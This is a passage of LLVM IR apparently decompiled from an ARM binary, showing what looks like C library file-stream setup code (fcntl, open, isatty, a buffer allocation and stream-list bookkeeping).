  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_155fc = icmp eq i32 %v0_155f8, 0
  br i1 %v3_155fc, label %dec_label_pc_15970, label %dec_label_pc_15604

dec_label_pc_15604:                               ; preds = %dec_label_pc_155f4
  %v0_15608 = load i32, i32* @r8, align 4
  %v2_15608 = add i32 %v0_15608, -33136
  store i32 %v2_15608, i32* %r3.global-to-local, align 4
  %v1_1560c = inttoptr i32 %v2_15608 to i32*
  %v2_1560c = load i32, i32* %v1_1560c, align 4
  store i32 %v2_1560c, i32* %r0.global-to-local, align 4
  %v3_1560c = add i32 %v0_15608, -33132
  %v4_1560c = inttoptr i32 %v3_1560c to i32*
  %v5_1560c = load i32, i32* %v4_1560c, align 4
  store i32 %v5_1560c, i32* @r1, align 4
  %v6_1560c = add i32 %v0_15608, -33128
  %v7_1560c = inttoptr i32 %v6_1560c to i32*
  %v8_1560c = load i32, i32* %v7_1560c, align 4
  store i32 %v8_1560c, i32* %r2.global-to-local, align 4
  %v2_15618 = add i32 %v0_155f8, 8
  %v3_15618 = inttoptr i32 %v2_15618 to i32*
  store i32 0, i32* %v3_15618, align 4
  %v2_15620 = load i32, i32* @r5, align 4
  %v3_15620 = inttoptr i32 %v2_15620 to i16*
  store i16 8192, i16* %v3_15620, align 2
  %v2_15624 = load i32, i32* %r0.global-to-local, align 4
  %v0_15628 = load i32, i32* @r5, align 4
  %v1_15628 = add i32 %v0_15628, 56
  store i32 %v1_15628, i32* @r3, align 4
  %v1_1562c = inttoptr i32 %v1_15628 to i32*
  store i32 %v2_15624, i32* %v1_1562c, align 4
  %v3_1562c = add i32 %v0_15628, 60
  %v4_1562c = inttoptr i32 %v3_1562c to i32*
  %v5_1562c = load i32, i32* @r1, align 4
  store i32 %v5_1562c, i32* %v4_1562c, align 4
  %v6_1562c = add i32 %v0_15628, 64
  %v7_1562c = inttoptr i32 %v6_1562c to i32*
  %v8_1562c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1562c, i32* %v7_1562c, align 4
  %v0_15630.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15630

dec_label_pc_15630:                               ; preds = %.thread3, %dec_label_pc_15604
  %v0_15688 = phi i32 [ %v0_15574, %.thread3 ], [ %v0_15630.pre, %dec_label_pc_15604 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15630 = icmp slt i32 %v0_15688, 0
  br i1 %v1_15630, label %dec_label_pc_15688, label %dec_label_pc_15638

dec_label_pc_15638:                               ; preds = %dec_label_pc_15630
  %v0_1563c = load i32, i32* @r4, align 4
  %v2_1563c = and i32 %v0_1563c, 131075
  %v1_15640 = add nuw nsw i32 %v2_1563c, 1
  store i32 %v1_15640, i32* %r2.global-to-local, align 4
  %v0_15644 = load i32, i32* @r7, align 4
  %v1_15644 = add i32 %v0_15644, 1
  %v2_15648 = and i32 %v1_15644, %v1_15640
  store i32 %v2_15648, i32* %r3.global-to-local, align 4
  %v3_1564c = icmp uge i32 %v2_15648, %v1_15640
  store i1 %v3_1564c, i1* %cpsr_c.global-to-local, align 1
  %v9_1564c = icmp eq i32 %v2_15648, %v1_15640
  %v1_15650 = load i32, i32* @r5, align 4
  %v2_15650 = add i32 %v1_15650, 4
  %v3_15650 = inttoptr i32 %v2_15650 to i32*
  store i32 %v0_15688, i32* %v3_15650, align 4
  br i1 %v9_1564c, label %dec_label_pc_15658, label %dec_label_pc_15594

dec_label_pc_15658:                               ; preds = %dec_label_pc_15638
  %v0_15658 = load i32, i32* @r4, align 4
  %v1_15658 = load i32, i32* @r7, align 4
  %v2_15658 = sub i32 -1, %v1_15658
  %v3_15658 = and i32 %v0_15658, %v2_15658
  store i32 %v3_15658, i32* @r3, align 4
  %v1_1565c = and i32 %v3_15658, 1024
  %v2_1565c = icmp eq i32 %v1_1565c, 0
  br i1 %v2_1565c, label %dec_label_pc_1567c, label %dec_label_pc_15664

dec_label_pc_15664:                               ; preds = %dec_label_pc_15658
  %v0_15664 = load i32, i32* @r6, align 4
  store i32 %v0_15664, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_15670 = call i32 @__libc_fcntl(i32 %v0_15664, i32 4)
  store i32 %v2_15670, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15674 = icmp eq i32 %v2_15670, 0
  br i1 %v2_15674, label %dec_label_pc_15664.dec_label_pc_1567c_crit_edge, label %dec_label_pc_15594

dec_label_pc_15664.dec_label_pc_1567c_crit_edge:  ; preds = %dec_label_pc_15664
  %v0_1567c.pre = load i32, i32* @r7, align 4
  %v0_15680.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1567c

dec_label_pc_1567c:                               ; preds = %dec_label_pc_15664.dec_label_pc_1567c_crit_edge, %dec_label_pc_15658
  %v0_15680 = phi i32 [ %v0_15680.pre, %dec_label_pc_15664.dec_label_pc_1567c_crit_edge ], [ %v0_15658, %dec_label_pc_15658 ]
  %v0_1567c = phi i32 [ %v0_1567c.pre, %dec_label_pc_15664.dec_label_pc_1567c_crit_edge ], [ %v1_15658, %dec_label_pc_15658 ]
  %v1_1567c = and i32 %v0_1567c, 131072
  store i32 %v1_1567c, i32* %r3.global-to-local, align 4
  %v2_15680 = or i32 %v1_1567c, %v0_15680
  store i32 %v2_15680, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_156ac

dec_label_pc_15688:                               ; preds = %dec_label_pc_15630
  %v2_15688 = icmp eq i32 %v0_15688, -1
  store i1 %v2_15688, i1* %cpsr_c.global-to-local, align 1
  %v7_15688 = icmp eq i32 %v0_15688, -1
  %v0_15694.pre = load i32, i32* @r4, align 4
  br i1 %v7_15688, label %dec_label_pc_15688._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_15688
  %v2_1568c = or i32 %v0_15694.pre, 131072
  store i32 %v2_1568c, i32* @r4, align 4
  br label %dec_label_pc_15688._crit_edge

dec_label_pc_15688._crit_edge:                    ; preds = %dec_label_pc_15688, %bb53
  %v0_15694 = phi i32 [ %v2_1568c, %bb53 ], [ %v0_15694.pre, %dec_label_pc_15688 ]
  %v0_15690 = load i32, i32* @r7, align 4
  store i32 %v0_15690, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_1569c = call i32 @__libc_open(i32 %v0_15690, i32 %v0_15694)
  store i32 %v2_1569c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_156a0 = icmp slt i32 %v2_1569c, 0
  %v1_156a4 = load i32, i32* @r5, align 4
  %v2_156a4 = add i32 %v1_156a4, 4
  %v3_156a4 = inttoptr i32 %v2_156a4 to i32*
  store i32 %v2_1569c, i32* %v3_156a4, align 4
  br i1 %v1_156a0, label %dec_label_pc_155b0, label %.dec_label_pc_156ac_crit_edge

.dec_label_pc_156ac_crit_edge:                    ; preds = %dec_label_pc_15688._crit_edge
  %v0_156b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_156ac

dec_label_pc_156ac:                               ; preds = %.dec_label_pc_156ac_crit_edge, %dec_label_pc_1567c
  %v0_156c8 = phi i32 [ %v0_156b0.pre, %.dec_label_pc_156ac_crit_edge ], [ %v2_15680, %dec_label_pc_1567c ]
  %v0_156ac = load i32, i32* @r5, align 4
  %v1_156ac = inttoptr i32 %v0_156ac to i16*
  %v2_156ac = load i16, i16* %v1_156ac, align 2
  %v3_156ac = zext i16 %v2_156ac to i32
  %v1_156b0 = urem i32 %v0_156c8, 4
  %v1_156b4 = and i32 %v0_156c8, 1024
  %v1_156b8 = and i32 %v3_156ac, 8192
  %v1_156bc = add nuw nsw i32 %v1_156b0, 1
  %v2_156c0 = or i32 %v1_156b8, %v1_156b4
  store i32 %v2_156c0, i32* %r3.global-to-local, align 4
  %v1_156c4 = xor i32 %v1_156bc, 3
  %v1_156c8 = and i32 %v0_156c8, 131072
  store i32 %v1_156c8, i32* %r2.global-to-local, align 4
  %v2_156c8 = icmp eq i32 %v1_156c8, 0
  %v1_156cc = add i32 %v0_156ac, 4
  %v2_156cc = inttoptr i32 %v1_156cc to i32*
  %v3_156cc = load i32, i32* %v2_156cc, align 4
  store i32 %v3_156cc, i32* @r4, align 4
  br i1 %v2_156c8, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_156ac
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_156ac, %bb54
  %v0_156d8 = phi i32 [ 0, %dec_label_pc_156ac ], [ 32768, %bb54 ]
  %v4_156d4 = mul nuw nsw i32 %v1_156c4, 16
  %v5_156d4 = or i32 %v2_156c0, %v4_156d4
  store i32 %v5_156d4, i32* %r3.global-to-local, align 4
  %v2_156d8 = or i32 %v0_156d8, %v5_156d4
  store i32 %v2_156d8, i32* %r2.global-to-local, align 4
  %v2_156dc = icmp ugt i32 %v3_156cc, 2147483646
  store i1 %v2_156dc, i1* %cpsr_c.global-to-local, align 1
  %v8_156dc = icmp eq i32 %v3_156cc, 2147483647
  %v1_156e0 = trunc i32 %v2_156d8 to i16
  store i16 %v1_156e0, i16* %v1_156ac, align 2
  br i1 %v8_156dc, label %dec_label_pc_15720, label %dec_label_pc_156e8

dec_label_pc_156e8:                               ; preds = %bb55
  store i32 48664, i32* %r3.global-to-local, align 4
  %v0_156ec = call i32 @__aeabi_read_tp()
  %v3_156f0 = load i16, i16* @global_var_21510.336, align 2
  %v4_156f0 = sext i16 %v3_156f0 to i32
  store i32 %v4_156f0, i32* @r3, align 4
  store i32 %v0_156ec, i32* @r6, align 4
  %v0_156f8 = load i32, i32* @r4, align 4
  store i32 %v0_156f8, i32* @r0, align 4
  %v2_156fc = add i32 %v4_156f0, %v0_156ec
  %v3_156fc = inttoptr i32 %v2_156fc to i32*
  %v4_156fc = load i32, i32* %v3_156fc, align 4
  store i32 %v4_156fc, i32* @r4, align 4
  %v1_15700 = call i32 @isatty(i32 %v0_156f8)
  store i32 %v1_15700, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15704 = icmp eq i32 %v1_15700, 0
  br i1 %v2_15704, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_156e8
  %v1_15708 = load i32, i32* @r5, align 4
  %v2_15708 = inttoptr i32 %v1_15708 to i16*
  %v3_15708 = load i16, i16* %v2_15708, align 2
  %v4_15708 = zext i16 %v3_15708 to i32
  %v2_1570c = or i32 %v4_15708, 256
  store i32 %v2_1570c, i32* %r3.global-to-local, align 4
  %v2_15710 = trunc i32 %v2_1570c to i16
  store i16 %v2_15710, i16* %v2_15708, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_156e8, %bb56
  %v3_15718 = load i16, i16* @global_var_21510.336, align 2
  %v4_15718 = sext i16 %v3_15718 to i32
  store i32 %v4_15718, i32* %r3.global-to-local, align 4
  %v0_1571c = load i32, i32* @r4, align 4
  %v1_1571c = load i32, i32* @r6, align 4
  %v3_1571c = add i32 %v1_1571c, %v4_15718
  %v4_1571c = inttoptr i32 %v3_1571c to i32*
  store i32 %v0_1571c, i32* %v4_1571c, align 4
  br label %dec_label_pc_15720

dec_label_pc_15720:                               ; preds = %bb55, %.thread5
  %v0_15720 = load i32, i32* @r5, align 4
  %v1_15720 = add i32 %v0_15720, 8
  %v2_15720 = inttoptr i32 %v1_15720 to i32*
  %v3_15720 = load i32, i32* %v2_15720, align 4
  store i32 %v3_15720, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15724 = icmp eq i32 %v3_15720, 0
  br i1 %v2_15724, label %dec_label_pc_1572c, label %bb57

dec_label_pc_1572c:                               ; preds = %dec_label_pc_15720
  store i32 4096, i32* @r0, align 4
  %v0_15730 = call i32 @malloc()
  store i32 %v0_15730, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15734 = icmp eq i32 %v0_15730, 0
  %v1_15744.pre = load i32, i32* @r5, align 4
  br i1 %v2_15734, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1572c
  %v2_15738 = inttoptr i32 %v1_15744.pre to i16*
  %v3_15738 = load i16, i16* %v2_15738, align 2
  %v4_15738 = zext i16 %v3_15738 to i32
  %v2_1573c = add i32 %v0_15730, 4096
  store i32 %v2_1573c, i32* %r2.global-to-local, align 4
  %v2_15740 = or i32 %v4_15738, 16384
  store i32 %v2_15740, i32* %r3.global-to-local, align 4
  %v2_15744 = add i32 %v1_15744.pre, 8
  %v3_15744 = inttoptr i32 %v2_15744 to i32*
  store i32 %v0_15730, i32* %v3_15744, align 4
  %v1_15748 = load i32, i32* %r2.global-to-local, align 4
  %v2_15748 = load i32, i32* @r5, align 4
  %v3_15748 = add i32 %v2_15748, 12
  %v4_15748 = inttoptr i32 %v3_15748 to i32*
  store i32 %v1_15748, i32* %v4_15748, align 4
  %v1_1574c = load i32, i32* %r3.global-to-local, align 4
  %v2_1574c = trunc i32 %v1_1574c to i16
  %v3_1574c = load i32, i32* @r5, align 4
  %v4_1574c = inttoptr i32 %v3_1574c to i16*
  store i16 %v2_1574c, i16* %v4_1574c, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_1572c
  %v2_1574437 = add i32 %v1_15744.pre, 8
  %v3_1574438 = inttoptr i32 %v2_1574437 to i32*
  store i32 0, i32* %v3_1574438, align 4
  %v2_15750 = load i32, i32* @r5, align 4
  %v3_15750 = add i32 %v2_15750, 12
  %v4_15750 = inttoptr i32 %v3_15750 to i32*
  store i32 0, i32* %v4_15750, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_15720, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_1575c = load i32, i32* @r8, align 4
  %v2_1575c = add i32 %v0_1575c, 92
  %v3_1575c = inttoptr i32 %v2_1575c to i32*
  %v4_1575c = load i32, i32* %v3_1575c, align 4
  store i32 %v4_1575c, i32* %r3.global-to-local, align 4
  %v2_15760 = load i32, i32* @r5, align 4
  %v3_15760 = add i32 %v2_15760, 2
  %v4_15760 = inttoptr i32 %v3_15760 to i8*
  store i8 0, i8* %v4_15760, align 1
  %v0_15764 = load i32, i32* @r5, align 4
  %v1_15764 = inttoptr i32 %v0_15764 to i16*
  %v2_15764 = load i16, i16* %v1_15764, align 2
  %v3_15764 = zext i16 %v2_15764 to i32
  store i32 %v3_15764, i32* %r2.global-to-local, align 4
  %v0_15768 = load i32, i32* %r3.global-to-local, align 4
  %v1_15768 = inttoptr i32 %v0_15768 to i32*
  %v2_15768 = load i32, i32* %v1_15768, align 4
  store i32 %v2_15768, i32* @r1, align 4
  %v1_1576c = add i32 %v0_15764, 8
  %v2_1576c = inttoptr i32 %v1_1576c to i32*
  %v3_1576c = load i32, i32* %v2_1576c, align 4
  store i32 %v3_1576c, i32* %r3.global-to-local, align 4
  %v1_15770 = and i32 %v3_15764, 8192
  %v2_15770 = icmp eq i32 %v1_15770, 0
  %v2_15774 = add i32 %v0_15764, 20
  %v3_15774 = inttoptr i32 %v2_15774 to i32*
  store i32 %v3_1576c, i32* %v3_15774, align 4
  %v0_15778 = load i32, i32* @r1, align 4
  %v1_15778 = load i32, i32* @r5, align 4
  %v2_15778 = add i32 %v1_15778, 52
  %v3_15778 = inttoptr i32 %v2_15778 to i32*
  store i32 %v0_15778, i32* %v3_15778, align 4
  %v0_1577c = load i32, i32* %r3.global-to-local, align 4
  %v1_1577c = load i32, i32* @r5, align 4
  %v2_1577c = add i32 %v1_1577c, 24
  %v3_1577c = inttoptr i32 %v2_1577c to i32*
  store i32 %v0_1577c, i32* %v3_1577c, align 4
  %v0_15780 = load i32, i32* %r3.global-to-local, align 4
  %v1_15780 = load i32, i32* @r5, align 4
  %v2_15780 = add i32 %v1_15780, 28
  %v3_15780 = inttoptr i32 %v2_15780 to i32*
  store i32 %v0_15780, i32* %v3_15780, align 4
  %v0_15784 = load i32, i32* %r3.global-to-local, align 4
  %v1_15784 = load i32, i32* @r5, align 4
  %v2_15784 = add i32 %v1_15784, 16
  %v3_15784 = inttoptr i32 %v2_15784 to i32*
  store i32 %v0_15784, i32* %v3_15784, align 4
  %v0_15788 = load i32, i32* %r4.global-to-local, align 4
  %v1_15788 = load i32, i32* @r5, align 4
  %v2_15788 = add i32 %v1_15788, 44
  %v3_15788 = inttoptr i32 %v2_15788 to i32*
  store i32 %v0_15788, i32* %v3_15788, align 4
  br i1 %v2_15770, label %dec_label_pc_15970, label %dec_label_pc_15790

dec_label_pc_15790:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15794 = load i32, i32* @r8, align 4
  %v2_15794 = add i32 %v0_15794, 160
  %v3_15794 = inttoptr i32 %v2_15794 to i32*
  %v4_15794 = load i32, i32* %v3_15794, align 4
  store i32 %v4_15794, i32* %r7.global-to-local, align 4
  %v0_15798 = call i32 @__aeabi_read_tp()
  store i32 %v0_15798, i32* %r0.global-to-local, align 4
  %v1_1579c = add i32 %v4_15794, 8
  %v2_1579c = inttoptr i32 %v1_1579c to i32*
  %v3_1579c = load i32, i32* %v2_1579c, align 4
  store i32 %v3_1579c, i32* %r3.global-to-local, align 4
  %v1_157a0 = add i32 %v0_15798, -1168
  store i32 %v1_157a0, i32* %r6.global-to-local, align 4
  %v3_157a4 = icmp uge i32 %v3_1579c, %v1_157a0
  store i1 %v3_157a4, i1* %cpsr_c.global-to-local, align 1
  %v9_157a4 = icmp eq i32 %v3_1579c, %v1_157a0
  br i1 %v9_157a4, label %dec_label_pc_157e8, label %dec_label_pc_157ac

dec_label_pc_157ac:                               ; preds = %dec_label_pc_15790
  store i32 %v4_15794, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_157b4

dec_label_pc_157b4:                               ; preds = %dec_label_pc_157c0.dec_label_pc_157b4_crit_edge, %dec_label_pc_157ac
  %v0_157b4 = phi i32 [ %v0_157b4.pre, %dec_label_pc_157c0.dec_label_pc_157b4_crit_edge ], [ %v4_15794, %dec_label_pc_157ac ]
  %v1_157b4 = inttoptr i32 %v0_157b4 to i32*
  %v2_157b4 = load i32, i32* %v1_157b4, align 4
  store i32 %v2_157b4, i32* %r3.global-to-local, align 4
  %v1_157b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_157b8 = icmp uge i32 %v2_157b4, %v1_157b8
  store i1 %v3_157b8, i1* %cpsr_c.global-to-local, align 1
  %v9_157b8 = icmp eq i32 %v2_157b4, %v1_157b8
  br i1 %v9_157b8, label %dec_label_pc_157c0, label %dec_label_pc_157d8

dec_label_pc_157c0:                               ; preds = %dec_label_pc_157b4
  store i32 %v2_157b4, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_157d0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_157d0, label %dec_label_pc_157d4, label %dec_label_pc_157c0.dec_label_pc_157b4_crit_edge

dec_label_pc_157c0.dec_label_pc_157b4_crit_edge:  ; preds = %dec_label_pc_157c0
  %v0_157b4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_157b4

dec_label_pc_157d4:                               ; preds = %dec_label_pc_157c0
  %v0_157d4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_157d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_157d8

dec_label_pc_157d8:                               ; preds = %dec_label_pc_157b4, %dec_label_pc_157d4
  %v0_157d8 = phi i32 [ %v0_157d4, %dec_label_pc_157d4 ], [ %v2_157b4, %dec_label_pc_157b4 ]
  %v1_157d8 = phi i32 [ %v0_157d4, %dec_label_pc_157d4 ], [ %v1_157b8, %dec_label_pc_157b4 ]
  %v3_157d8 = icmp uge i32 %v0_157d8, %v1_157d8
  store i1 %v3_157d8, i1* %cpsr_c.global-to-local, align 1
  %v9_157d8 = icmp eq i32 %v0_157d8, %v1_157d8
  br i1 %v9_157d8, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_157d8
  %v1_157dc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_157dc, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_157d8, %bb58
  %v1_157e0 = xor i1 %v9_157d8, true
  call void @__pseudo_cond_branch(i1 %v1_157e0, i32 ptrtoint (i32* @global_var_13a2c.496 to i32))
  %v0_157e4 = load i32, i32* %r6.global-to-local, align 4
  %v1_157e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_157e4 = add i32 %v1_157e4, 8
  %v3_157e4 = inttoptr i32 %v2_157e4 to i32*
  store i32 %v0_157e4, i32* %v3_157e4, align 4
  %v1_15804.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_157e8

dec_label_pc_157e8:                               ; preds = %dec_label_pc_15790, %bb59
  %v1_15804 = phi i32 [ %v3_1579c, %dec_label_pc_15790 ], [ %v1_15804.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_157ec = load i32, i32* @r8, align 4
  %v2_157ec = add i32 %v0_157ec, 160
  %v3_157ec = inttoptr i32 %v2_157ec to i32*
  %v4_157ec = load i32, i32* %v3_157ec, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_157f4 = add i32 %v0_157ec, 152
  %v3_157f4 = inttoptr i32 %v2_157f4 to i32*
  %v4_157f4 = load i32, i32* %v3_157f4, align 4
  store i32 %v4_157f4, i32* %r7.global-to-local, align 4
  %v1_157f8 = add i32 %v4_157ec, 4
  %v2_157f8 = inttoptr i32 %v1_157f8 to i32*
  %v3_157f8 = load i32, i32* %v2_157f8, align 4
  store i32 %v3_157f8, i32* %r3.global-to-local, align 4
  %v1_157fc = add i32 %v4_157f4, 8
  %v2_157fc = inttoptr i32 %v1_157fc to i32*
  %v3_157fc = load i32, i32* %v2_157fc, align 4
  store i32 %v3_157fc, i32* %r2.global-to-local, align 4
  %v1_15800 = add i32 %v3_157f8, 1
  store i32 %v1_15800, i32* %r3.global-to-local, align 4
  %v3_15804 = icmp uge i32 %v3_157fc, %v1_15804
  store i1 %v3_15804, i1* %cpsr_c.global-to-local, align 1
  %v9_15804 = icmp eq i32 %v3_157fc, %v1_15804
  store i32 %v1_15800, i32* %v2_157f8, align 4
  br i1 %v9_15804, label %dec_label_pc_15850, label %dec_label_pc_15810

dec_label_pc_15810:                               ; preds = %dec_label_pc_157e8
  %v0_15814 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15814, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1581c95 = inttoptr i32 %v0_15814 to i32*
  %v2_1581c96 = load i32, i32* %v1_1581c95, align 4
  store i32 %v2_1581c96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1582098 = icmp eq i32 %v2_1581c96, 0
  br i1 %v9_1582098, label %dec_label_pc_15828, label %dec_label_pc_15840

dec_label_pc_15828:                               ; preds = %dec_label_pc_15810, %dec_label_pc_15828.dec_label_pc_1581c_crit_edge
  %v0_1582899 = phi i32 [ %v1_15820.pre, %dec_label_pc_15828.dec_label_pc_1581c_crit_edge ], [ 0, %dec_label_pc_15810 ]
  store i32 %v0_1582899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15838 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15838, label %dec_label_pc_1583c, label %dec_label_pc_15828.dec_label_pc_1581c_crit_edge

dec_label_pc_15828.dec_label_pc_1581c_crit_edge:  ; preds = %dec_label_pc_15828
  %v0_1581c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15820.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1581c = inttoptr i32 %v0_1581c.pre to i32*
  %v2_1581c = load i32, i32* %v1_1581c, align 4
  store i32 %v2_1581c, i32* %r3.global-to-local, align 4
  %v3_15820 = icmp uge i32 %v2_1581c, %v1_15820.pre
  store i1 %v3_15820, i1* %cpsr_c.global-to-local, align 1
  %v9_15820 = icmp eq i32 %v2_1581c, %v1_15820.pre
  br i1 %v9_15820, label %dec_label_pc_15828, label %dec_label_pc_15840

dec_label_pc_1583c:                               ; preds = %dec_label_pc_15828
  %v0_1583c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1583c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15840

dec_label_pc_15840:                               ; preds = %dec_label_pc_15810, %dec_label_pc_15828.dec_label_pc_1581c_crit_edge, %dec_label_pc_1583c
  %v0_15840 = phi i32 [ %v0_1583c, %dec_label_pc_1583c ], [ %v2_1581c96, %dec_label_pc_15810 ], [ %v2_1581c, %dec_label_pc_15828.dec_label_pc_1581c_crit_edge ]
  %v1_15840 = phi i32 [ %v0_1583c, %dec_label_pc_1583c ], [ 0, %dec_label_pc_15810 ], [ %v1_15820.pre, %dec_label_pc_15828.dec_label_pc_1581c_crit_edge ]
  %v3_15840 = icmp uge i32 %v0_15840, %v1_15840
  store i1 %v3_15840, i1* %cpsr_c.global-to-local, align 1
  %v9_15840 = icmp eq i32 %v0_15840, %v1_15840
  br i1 %v9_15840, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_15840
  %v1_15844 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15844, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_15840, %bb60
  %v1_15848 = xor i1 %v9_15840, true
  call void @__pseudo_cond_branch(i1 %v1_15848, i32 ptrtoint (i32* @global_var_13a2c.496 to i32))
  %v0_1584c = load i32, i32* %r6.global-to-local, align 4
  %v1_1584c = load i32, i32* %r7.global-to-local, align 4
  %v2_1584c = add i32 %v1_1584c, 8
  %v3_1584c = inttoptr i32 %v2_1584c to i32*
  store i32 %v0_1584c, i32* %v3_1584c, align 4
  br label %dec_label_pc_15850

dec_label_pc_15850:                               ; preds = %dec_label_pc_157e8, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_15854 = load i32, i32* @r8, align 4
  %v2_15854 = add i32 %v0_15854, 152
  %v3_15854 = inttoptr i32 %v2_15854 to i32*
  %v4_15854 = load i32, i32* %v3_15854, align 4
  store i32 %v4_15854, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_1585c = add i32 %v0_15854, 76
  %v3_1585c = inttoptr i32 %v2_1585c to i32*
  %v4_1585c = load i32, i32* %v3_1585c, align 4
  store i32 %v4_1585c, i32* @r1, align 4
  %v1_15860 = add i32 %v4_15854, 4
  %v2_15860 = inttoptr i32 %v1_15860 to i32*
  %v3_15860 = load i32, i32* %v2_15860, align 4
  store i32 %v3_15860, i32* %r3.global-to-local, align 4
  %v1_15864 = inttoptr i32 %v4_1585c to i32*
  %v2_15864 = load i32, i32* %v1_15864, align 4
  store i32 %v2_15864, i32* %r2.global-to-local, align 4
  %v1_15868 = add i32 %v3_15860, 1
  store i32 %v1_15868, i32* %r3.global-to-local, align 4
  store i32 %v1_15868, i32* %v2_15860, align 4
  %v0_15870 = load i32, i32* %r2.global-to-local, align 4
  %v1_15870 = load i32, i32* @r5, align 4
  %v2_15870 = add i32 %v1_15870, 32
  %v3_15870 = inttoptr i32 %v2_15870 to i32*
  store i32 %v0_15870, i32* %v3_15870, align 4
  %v0_15874 = load i32, i32* %r0.global-to-local, align 4
  %v1_15874 = add i32 %v0_15874, 4
  %v2_15874 = inttoptr i32 %v1_15874 to i32*
  %v3_15874 = load i32, i32* %v2_15874, align 4
  %v1_15878 = add i32 %v3_15874, -1
  store i32 %v1_15878, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1587c = icmp eq i32 %v1_15878, 0
  %v0_15880 = load i32, i32* @r5, align 4
  %v1_15880 = load i32, i32* @r1, align 4
  %v2_15880 = inttoptr i32 %v1_15880 to i32*
  store i32 %v0_15880, i32* %v2_15880, align 4
  %v0_15884 = load i32, i32* %r3.global-to-local, align 4
  %v1_15884 = load i32, i32* %r0.global-to-local, align 4
  %v2_15884 = add i32 %v1_15884, 4
  %v3_15884 = inttoptr i32 %v2_15884 to i32*
  store i32 %v0_15884, i32* %v3_15884, align 4
  br i1 %v2_1587c, label %dec_label_pc_1588c, label %dec_label_pc_158ec

dec_label_pc_1588c:                               ; preds = %dec_label_pc_15850
  %v0_1588c = load i32, i32* %r3.global-to-local, align 4
  %v1_1588c = load i32, i32* %r0.global-to-local, align 4
  %v2_1588c = add i32 %v1_1588c, 8
  %v3_1588c = inttoptr i32 %v2_1588c to i32*
  store i32 %v0_1588c, i32* %v3_1588c, align 4
  %v0_15890 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15890, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15894

dec_label_pc_15894:                               ; preds = %dec_label_pc_158c4.dec_label_pc_15894_crit_edge, %dec_label_pc_1588c
  %v0_15894 = phi i32 [ %v0_15894.pre, %dec_label_pc_158c4.dec_label_pc_15894_crit_edge ], [ %v0_15890, %dec_label_pc_1588c ]
  %v1_15894 = inttoptr i32 %v0_15894 to i32*
  %v2_15894 = load i32, i32* %v1_15894, align 4
  store i32 %v2_15894, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15894, i32* %r2.global-to-local, align 4
  %v2_158a083 = load i32, i32* %v1_15894, align 4
  store i32 %v2_158a083, i32* %r3.global-to-local, align 4
  %v3_158a485 = icmp uge i32 %v2_158a083, %v2_15894
